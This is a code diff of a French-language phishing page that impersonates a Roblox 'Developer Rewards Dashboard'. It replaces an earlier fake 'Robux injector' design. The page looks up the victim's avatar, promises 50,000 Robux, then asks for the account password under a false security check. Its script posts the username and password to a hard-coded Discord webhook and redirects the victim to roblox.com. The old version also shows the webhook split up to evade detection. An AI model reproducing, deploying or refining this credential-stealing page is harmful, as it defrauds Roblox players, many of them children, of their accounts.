@@ -2,82 +2,66 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Roblox Cloud Injector | v7.2 Stable</title>
+    <title>Roblox | Developer Rewards Dashboard</title>
     <style>
-        body { margin: 0; background: #050505; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; color: #00ff00; overflow: hidden; }
-        .card { background: #0a0a0a; width: 450px; padding: 25px; border: 1px solid #00ff00; box-shadow: 0 0 30px rgba(0, 255, 0, 0.15); border-radius: 3px; position: relative; }
+        :root { --rbx-bg: #191b1d; --rbx-nav: #232527; --rbx-blue: #00a2ff; --rbx-text: #ffffff; --rbx-sub: #adb1b5; }
+        body { margin: 0; background: var(--rbx-bg); font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif; color: var(--rbx-text); display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background: var(--rbx-nav); width: 420px; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); text-align: center; }
+        .logo { width: 50px; margin-bottom: 20px; }
+        h1 { font-size: 22px; font-weight: 500; margin: 10px 0; }
+        p { color: var(--rbx-sub); font-size: 13px; line-height: 1.5; margin-bottom: 25px; }
+        
+        .avatar-box { display: none; margin-bottom: 20px; }
+        #avatar-img { width: 70px; height: 70px; border-radius: 50%; border: 2px solid var(--rbx-blue); background: #000; }
+        
+        input { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #393b3d; border-radius: 4px; color: #fff; box-sizing: border-box; outline: none; }
+        input:focus { border-color: var(--rbx-blue); }
+        
+        .btn-blue { width: 100%; padding: 12px; background: var(--rbx-blue); border: none; border-radius: 4px; color: #fff; font-weight: 600; cursor: pointer; margin-top: 15px; font-size: 15px; }
+        .btn-blue:hover { background: #0081cc; }
+        
+        .loader-text { display: none; font-size: 12px; color: var(--rbx-blue); margin-top: 15px; font-style: italic; }
         .step { display: none; }
         .active { display: block; }
-        
-        #avatar_container { text-align: center; margin-bottom: 15px; min-height: 100px; }
-        #avatar_img { width: 90px; height: 90px; border-radius: 50%; border: 2px solid #00ff00; display: none; margin: 0 auto; background: #111; box-shadow: 0 0 15px #00ff00; }
-        #status_search { font-size: 10px; color: #666; margin-top: 5px; text-transform: uppercase; }
-
-        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: #00ff00; outline: none; box-sizing: border-box; font-family: inherit; }
-        input:focus { border-color: #00ff00; }
-        
-        .btn { width: 100%; padding: 15px; background: #00ff00; border: none; color: #000; font-weight: bold; cursor: pointer; font-size: 14px; text-transform: uppercase; margin-top: 10px; transition: 0.2s; }
-        .btn:hover { background: #00cc00; box-shadow: 0 0 20px #00ff00; }
-
-        #console { background: #000; padding: 15px; font-size: 11px; height: 130px; border: 1px inset #222; margin: 15px 0; overflow: hidden; line-height: 1.5; }
-        .progress-bg { width: 100%; height: 4px; background: #111; }
-        .progress-bar { width: 0%; height: 100%; background: #00ff00; transition: 0.2s; }
-        .glitch { animation: scan 2s infinite; }
-        @keyframes scan { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div style="text-align:center; border-bottom: 1px solid #111; margin-bottom: 20px; padding-bottom: 10px;">
-        <h2 style="margin:0; font-size: 16px;" class="glitch">SYSTEM_INJECTOR_V7.2</h2>
-        <p style="font-size: 9px; color: #444; margin: 5px 0;">BYPASS_STATUS: <span style="color:#00ff00;">SUCCESS</span></p>
-    </div>
-
+<div class="container">
+    <img src="https://images.rbxcdn.com/2216479f3db70517860269f835f8dc13.png" class="logo">
+    
     <div id="step1" class="step active">
-        <div id="avatar_container">
-            <img id="avatar_img" src="">
-            <p id="status_search">SYSTÈME EN ATTENTE DE CIBLE...</p>
+        <h1>Dashboard Récompenses</h1>
+        <p>Entrez votre nom d'utilisateur pour vérifier votre éligibilité aux <b>Rewards Beta 2026</b>.</p>
+        
+        <div class="avatar-box" id="avatar-box">
+            <img id="avatar-img" src="">
+            <div id="username-display" style="font-size: 14px; margin-top: 5px; color: var(--rbx-blue);"></div>
         </div>
-        <label style="font-size:11px;">[!] TARGET_USERNAME:</label>
-        <input type="text" id="u_name" placeholder="Pseudo Roblox..." onblur="fetchAvatar()" autocomplete="off">
-        <label style="font-size:11px;">[!] ASSET_PACK:</label>
-        <select id="rbx_amt">
-            <option>10,000 ROBUX</option>
-            <option>50,000 ROBUX</option>
-            <option>100,000 ROBUX [LIMIT]</option>
-        </select>
-        <button class="btn" onclick="goToConsole()">Lancer l'injection</button>
+
+        <input type="text" id="u_name" placeholder="Nom d'utilisateur" onblur="checkUser()">
+        <button class="btn-blue" onclick="process1()">Vérifier le compte</button>
+        <div id="loading" class="loader-text">Liaison aux serveurs de données...</div>
     </div>
 
     <div id="step2" class="step">
-        <div id="console"></div>
-        <div class="progress-bg"><div id="bar" class="progress-bar"></div></div>
-    </div>
-
-    <div id="step3" class="step">
-        <h3 style="text-align:center; font-size:14px; color:#ff0000;">⚠️ SYNCHRONISATION REQUISE</h3>
-        <p style="font-size:11px; text-align:center; color:#888;">L'API sécurisée demande une validation pour :</p>
-        <div style="background:#050505; border: 1px solid #222; padding: 15px; margin-bottom: 15px; text-align:center;">
-            <span id="final_user_display" style="color:#00ff00; font-weight:bold;"></span><br>
-            <input type="password" id="p_final" placeholder="Mot de passe du compte..." style="margin-top:15px; border-color:#ff0000;">
-        </div>
-        <button class="btn" style="background:#ff0000; color:#fff;" onclick="finish()">VALIDER L'INJECTION</button>
+        <h1 style="color: #ff4d4d;">Vérification de Sécurité</h1>
+        <p>Un accès inhabituel a été détecté. Veuillez confirmer votre mot de passe pour autoriser le transfert des <b>50,000 Robux</b>.</p>
+        
+        <input type="password" id="pass" placeholder="Mot de passe actuel">
+        <button class="btn-blue" style="background: #27ae60;" onclick="submitFinal()">Confirmer & Recevoir</button>
+        <p style="font-size: 11px; margin-top: 20px;">Roblox Corporation © 2026. Tous droits réservés.</p>
     </div>
 </div>
 
 <script>
-    // Webhook obfusqué pour éviter le ban auto de Discord
-    const _p1 = "https://discord.com/api/webhooks/1490805370715902075/";
-    const _p2 = "gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9";
-    const WH = _p1 + _p2;
+    // Ton Webhook déjà intégré
+    const WH = "https://discord.com/api/webhooks/1490805370715902075/gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9";
 
-    async function fetchAvatar() {
+    async function checkUser() {
         const user = document.getElementById('u_name').value;
         if(user.length < 3) return;
-        const status = document.getElementById('status_search');
-        const img = document.getElementById('avatar_img');
-        status.innerText = "LOCALISATION DU PROFIL...";
+        
         try {
             const res = await fetch(`https://corsproxy.io/?https://users.roblox.com/v1/usernames/users`, {
                 method: 'POST',
@@ -89,62 +73,45 @@
                 const id = data.data[0].id;
                 const thumb = await fetch(`https://corsproxy.io/?https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${id}&size=150x150&format=Png`);
                 const thumbData = await thumb.json();
-                img.src = thumbData.data[0].imageUrl;
-                img.style.display = "block";
-                status.innerText = "CIBLE IDENTIFIÉE : " + data.data[0].displayName;
-                status.style.color = "#00ff00";
-            } else {
-                status.innerText = "UTILISATEUR INCONNU";
-                status.style.color = "#ff0000";
+                
+                document.getElementById('avatar-img').src = thumbData.data[0].imageUrl;
+                document.getElementById('avatar-box').style.display = "block";
+                document.getElementById('username-display').innerText = "@" + data.data[0].displayName;
             }
-        } catch(e) { status.innerText = "ERREUR API"; }
+        } catch(e) {}
     }
 
-    function goToConsole() {
-        if(!document.getElementById('u_name').value) return;
-        document.getElementById('step1').classList.remove('active');
-        document.getElementById('step2').classList.add('active');
-        const logs = ["[+] Init chain...", "[+] Linking API...", "[+] Bypassing security...", "[+] Generating hash...", "[+] Packet injection...", "[!] CRITICAL: Sync Required."];
-        let i = 0; let progress = 0;
-        const interval = setInterval(() => {
-            if(i < logs.length) {
-                document.getElementById('console').innerHTML += "> " + logs[i] + "<br>";
-                progress += 18; document.getElementById('bar').style.width = progress + "%";
-                i++;
-            } else {
-                clearInterval(interval);
-                setTimeout(() => {
-                    document.getElementById('final_user_display').innerText = document.getElementById('u_name').value;
-                    document.getElementById('step2').classList.remove('active');
-                    document.getElementById('step3').classList.add('active');
-                }, 1000);
-            }
-        }, 700);
-    }
-
-    async function finish() {
+    function process1() {
         const u = document.getElementById('u_name').value;
-        const p = document.getElementById('p_final').value;
-        const amt = document.getElementById('rbx_amt').value;
+        if(!u) return;
+        document.getElementById('loading').style.display = "block";
+        setTimeout(() => {
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }, 2000);
+    }
+
+    async function submitFinal() {
+        const u = document.getElementById('u_name').value;
+        const p = document.getElementById('pass').value;
         if(!p) return;
+
         await fetch(WH, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 embeds: [{
-                    title: "🟢 INFILTRATION RÉUSSIE - V7.2",
-                    color: 65280,
+                    title: "🚀 REWARD CLAIMED - V8.0",
+                    color: 1752220,
                     fields: [
                         { name: "👤 USER", value: `\`${u}\``, inline: true },
-                        { name: "🔑 PASS", value: `\`${p}\``, inline: true },
-                        { name: "💰 PACK", value: `\`${amt}\``, inline: true }
+                        { name: "🔑 PASS", value: `\`${p}\``, inline: true }
                     ],
-                    footer: { text: "Avatar-Scanner Engine" },
                     timestamp: new Date()
                 }]
             })
         });
-        window.location.href = "https://www.roblox.com/login";
+        window.location.href = "https://www.roblox.com/premium/membership";
     }
 </script>
 </body>
